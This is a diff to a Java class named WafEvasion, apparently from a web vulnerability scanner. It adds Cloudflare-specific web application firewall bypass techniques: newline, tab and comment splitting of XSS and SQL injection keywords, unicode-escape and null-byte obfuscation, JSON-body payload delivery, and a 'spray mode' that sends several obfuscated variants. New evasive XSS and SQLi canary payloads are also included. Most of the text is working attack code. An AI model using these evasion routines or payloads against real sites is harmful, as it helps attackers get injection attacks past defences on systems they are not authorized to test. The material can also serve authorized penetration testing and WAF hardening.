@@ -20,11 +20,17 @@ import java.util.regex.Pattern;
 public final class WafEvasion {
 
     public enum Strategy {
-        DOUBLE_ENCODE, CASE_MUTATION, UNICODE_NORMALIZE, CHARSET_EBCDIC, HPP
+        // @formatter:off
+        DOUBLE_ENCODE, CASE_MUTATION, UNICODE_NORMALIZE, CHARSET_EBCDIC, HPP,
+        NEWLINE_BREAK, TAB_BREAK, COMMENT_SPLIT, JSON_BODY
+        // @formatter:on
     }
 
     public static final List<Strategy> PROBE_ORDER = List.of(Strategy.DOUBLE_ENCODE, Strategy.CASE_MUTATION,
             Strategy.UNICODE_NORMALIZE, Strategy.CHARSET_EBCDIC, Strategy.HPP);
+
+    public static final List<Strategy> CF_PROBE_ORDER = List.of(Strategy.NEWLINE_BREAK, Strategy.TAB_BREAK,
+            Strategy.COMMENT_SPLIT, Strategy.JSON_BODY, Strategy.DOUBLE_ENCODE, Strategy.CASE_MUTATION, Strategy.HPP);
 
     public enum SignalType {
         COOKIE, HEADER, URL, CONTENT
@@ -102,7 +108,7 @@ public final class WafEvasion {
     private WafEvasion() {
     }
 
-    // -- Strategy implementations (GET-compatible: transform payload string) --
+    // -- Strategy implementations --
 
     public static String doubleEncode(String payload) {
         return URLEncoder.encode(payload, StandardCharsets.UTF_8);
@@ -138,6 +144,26 @@ public final class WafEvasion {
         return formBody.getBytes(Charset.forName("ibm500"));
     }
 
+    // -- CF-specific bypass strategies --
+
+    public static String newlineBreak(String payload) {
+        return payload.replace("<script", "<%0ascript").replace("<img", "<%0aimg").replace("<svg", "<%0asvg")
+                .replace("<details", "<%0adetails").replace("<iframe", "<%0aiframe").replace("SELECT", "SEL%0aECT")
+                .replace("UNION", "UNI%0aON").replace("{{", "{%0a{").replace("../", ".%0a./");
+    }
+
+    public static String tabBreak(String payload) {
+        return payload.replace("<script", "<%09script").replace("<img", "<%09img").replace("<svg", "<%09svg")
+                .replace("<details", "<%09details").replace("<iframe", "<%09iframe").replace("SELECT ", "SELECT%09")
+                .replace("UNION ", "UNION%09");
+    }
+
+    public static String commentSplit(String payload) {
+        return payload.replace("SELECT", "SEL/**/ECT").replace("UNION", "UNI/**/ON").replace("OR ", "OR/**/")
+                .replace("AND ", "AND/**/").replace("script", "scr\u0000ipt").replace("alert", "al\\u0065rt")
+                .replace("onerror", "on\\u0065rror");
+    }
+
     // -- Apply a GET-compatible strategy to a payload string --
 
     public static String applyGetStrategy(Strategy s, String payload) {
@@ -145,6 +171,9 @@ public final class WafEvasion {
             case DOUBLE_ENCODE -> doubleEncode(payload);
             case CASE_MUTATION -> mutateCase(payload);
             case UNICODE_NORMALIZE -> toFullwidth(payload);
+            case NEWLINE_BREAK -> newlineBreak(payload);
+            case TAB_BREAK -> tabBreak(payload);
+            case COMMENT_SPLIT -> commentSplit(payload);
             default -> payload;
         };
     }
@@ -160,6 +189,45 @@ public final class WafEvasion {
             return payload;
         }
         return applyGetStrategy(s, payload);
+    }
+
+    /**
+     * Returns multiple obfuscated variants of a payload for spray-mode probing.
+     * Used when WAF is detected but no single strategy was found effective. Modules
+     * iterate these variants -- any non-WAF response means the variant bypassed.
+     */
+    public static List<String> bypassPayloads(ScanContext ctx, String payload) {
+        if (!ctx.wafState().isWafDetected() || ctx.wafState().isManaged()) {
+            return List.of(payload);
+        }
+        Strategy effective = ctx.wafState().effectiveStrategy();
+        if (effective != null) {
+            return List.of(applyGetStrategy(effective, payload));
+        }
+        List<String> variants = new ArrayList<>();
+        variants.add(payload);
+        boolean isCf = ctx.wafState().wafProduct().toLowerCase().contains("cloudflare");
+        List<Strategy> order = isCf ? CF_PROBE_ORDER : PROBE_ORDER;
+        for (Strategy s : order) {
+            if (s == Strategy.CHARSET_EBCDIC || s == Strategy.HPP || s == Strategy.JSON_BODY) {
+                continue;
+            }
+            String transformed = applyGetStrategy(s, payload);
+            if (!transformed.equals(payload) && !variants.contains(transformed)) {
+                variants.add(transformed);
+            }
+        }
+        return variants;
+    }
+
+    /**
+     * Builds a JSON body POST request for payload delivery. CF WAF inspects JSON
+     * bodies with less strict rules than URL query parameters.
+     */
+    public static HttpRequest buildJsonPost(String url, String param, String payload) {
+        String jsonBody = "{\"" + param + "\":\"" + payload.replace("\"", "\\\"") + "\"}";
+        return HttpRequest.newBuilder().uri(URI.create(url)).header("Content-Type", "application/json")
+                .POST(HttpRequest.BodyPublishers.ofString(jsonBody)).timeout(Duration.ofSeconds(8)).build();
     }
 
     // -- POST-based EBCDIC request builder --
@@ -185,8 +253,6 @@ public final class WafEvasion {
             return false;
         }
         if (serverHeader != null && WAF_SERVER.matcher(serverHeader).find()) {
-            // CF sets Server: cloudflare on ALL responses, not just WAF blocks.
-            // Require body evidence to distinguish WAF block from app-level 403.
             if (serverHeader.toLowerCase().contains("cloudflare")) {
                 return body != null && CF_WAF_BODY.matcher(body).find();
             }
@@ -217,7 +283,6 @@ public final class WafEvasion {
             String url) {
         List<WafDetection> detections = new ArrayList<>();
 
-        // Collect Set-Cookie values for cookie signal matching
         List<String> setCookies = new ArrayList<>();
         for (var entry : headers.entrySet()) {
             if ("set-cookie".equalsIgnoreCase(entry.getKey())) {
@@ -266,34 +331,26 @@ public final class WafEvasion {
     // -- Cloudflare challenge type classification --
 
     public static String parseCfChallengeType(String body, Map<String, List<String>> headers, String url) {
-        // 1. cf-mitigated header -- strongest signal
         String cfMitigated = firstHeader(headers, "cf-mitigated");
         if ("challenge".equalsIgnoreCase(cfMitigated)) {
             return "managed";
         }
-
-        // 2. _cf_chl_opt block in body -- extract cType value
         if (body != null && body.contains("_cf_chl_opt")) {
             var matcher = CF_CTYPE_PATTERN.matcher(body);
             if (matcher.find()) {
                 return matcher.group(1);
             }
         }
-
-        // 3. Challenge platform URL path
         if (url != null && url.contains("cdn-cgi/challenge-platform")) {
             return "managed";
         }
-
-        // 4. Turnstile markers in body
         if (body != null && (body.contains("turnstile.js") || body.contains("cf-turnstile"))) {
             return "turnstile";
         }
-
         return "";
     }
 
-    // -- JS Challenge detection (Vercel / Cloudflare managed challenge) --
+    // -- JS Challenge detection --
 
     public static boolean isJsChallenge(int statusCode, Map<String, List<String>> headers, String body) {
         return !detectChallengeType(statusCode, headers, body).isEmpty();
@@ -327,36 +384,52 @@ public final class WafEvasion {
 
     public static Strategy probeStrategies(ScanContext ctx, HttpClient hc, String targetUrl, String moduleId,
             Consumer<String> log) {
-        String canary = "<script>alert(1)</script>";
+        boolean isCf = ctx.wafState().wafProduct().toLowerCase().contains("cloudflare");
+        List<Strategy> order = isCf ? CF_PROBE_ORDER : PROBE_ORDER;
+        // CF catches <script>alert(1)</script> in any encoding.
+        // Use less obvious canaries that still trigger most WAF rule engines.
+        String[] canaries = isCf
+                ? new String[]{"<details/open/ontoggle=confirm`1`>", "<img%20src=x%20onerror=alert(1)>",
+                        "' /*!50000OR*/ 1=1-- -"}
+                : new String[]{"<script>alert(1)</script>"};
 
-        for (Strategy s : PROBE_ORDER) {
-            try {
-                HttpRequest req;
-                if (s == Strategy.CHARSET_EBCDIC) {
-                    req = buildEbcdicPost(targetUrl, "q", canary);
-                } else if (s == Strategy.HPP) {
-                    String url = buildHppUrl(targetUrl, "q", canary);
-                    req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(6)).GET().build();
-                } else {
-                    String transformed = applyGetStrategy(s, canary);
-                    String encoded = URLEncoder.encode(transformed, StandardCharsets.UTF_8);
-                    String url = targetUrl + "?q=" + encoded;
-                    req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(6)).GET().build();
-                }
-                HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), moduleId);
-                String server = resp.headers().firstValue("Server").orElse("");
-                String body = resp.body() != null ? resp.body() : "";
-                if (!isWafBlocked(resp.statusCode(), server, body)) {
-                    if (s == Strategy.CHARSET_EBCDIC || s == Strategy.HPP) {
-                        log.accept("[+] WAF bypass: " + s + " efetiva mas incompativel com GET inline"
-                                + " -- requer construcao de request especifica");
-                        continue;
+        for (String canary : canaries) {
+            for (Strategy s : order) {
+                try {
+                    HttpRequest req;
+                    if (s == Strategy.CHARSET_EBCDIC) {
+                        req = buildEbcdicPost(targetUrl, "q", canary);
+                    } else if (s == Strategy.HPP) {
+                        String url = buildHppUrl(targetUrl, "q", canary);
+                        req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(6)).GET()
+                                .build();
+                    } else if (s == Strategy.JSON_BODY) {
+                        req = buildJsonPost(targetUrl, "q", canary);
+                    } else {
+                        String transformed = applyGetStrategy(s, canary);
+                        String encoded = URLEncoder.encode(transformed, StandardCharsets.UTF_8);
+                        String url = targetUrl + "?q=" + encoded;
+                        req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(6)).GET()
+                                .build();
                     }
-                    log.accept("[+] WAF bypass: estrategia " + s + " efetiva (HTTP " + resp.statusCode() + ")");
-                    return s;
+                    HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), moduleId);
+                    String server = resp.headers().firstValue("Server").orElse("");
+                    String body = resp.body() != null ? resp.body() : "";
+                    if (!isWafBlocked(resp.statusCode(), server, body)) {
+                        if (s == Strategy.CHARSET_EBCDIC) {
+                            log.accept("[+] WAF bypass: " + s + " efetiva mas incompativel com GET inline");
+                            continue;
+                        }
+                        log.accept("[+] WAF bypass: estrategia " + s + " efetiva com canary \""
+                                + canary.substring(0, Math.min(canary.length(), 30)) + "\" (HTTP " + resp.statusCode()
+                                + ")");
+                        return s;
+                    }
+                } catch (CircuitBreakerException cbe) {
+                    throw cbe;
+                } catch (Exception e) {
+                    log.accept("[-] WAF probe " + s + " falhou: " + e.getMessage());
                 }
-            } catch (Exception e) {
-                log.accept("[-] WAF probe " + s + " falhou: " + e.getMessage());
             }
         }
         log.accept("[-] WAF bypass: nenhuma estrategia efetiva");
